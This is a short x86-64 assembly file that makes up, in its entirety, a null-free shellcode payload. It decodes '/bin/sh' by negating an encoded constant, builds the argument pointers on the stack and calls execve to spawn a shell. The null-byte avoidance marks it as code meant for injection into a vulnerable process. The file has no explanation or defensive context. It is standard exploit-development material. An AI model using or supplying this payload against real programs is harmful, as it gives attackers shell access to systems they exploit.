section	.text
   global _start     ;must be declared for linker (ld)

_start:	            ;tells linker entry point

xor eax, eax
mov rbx, 0xff978cd091969dd1
neg rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov al, 0x3b
syscall
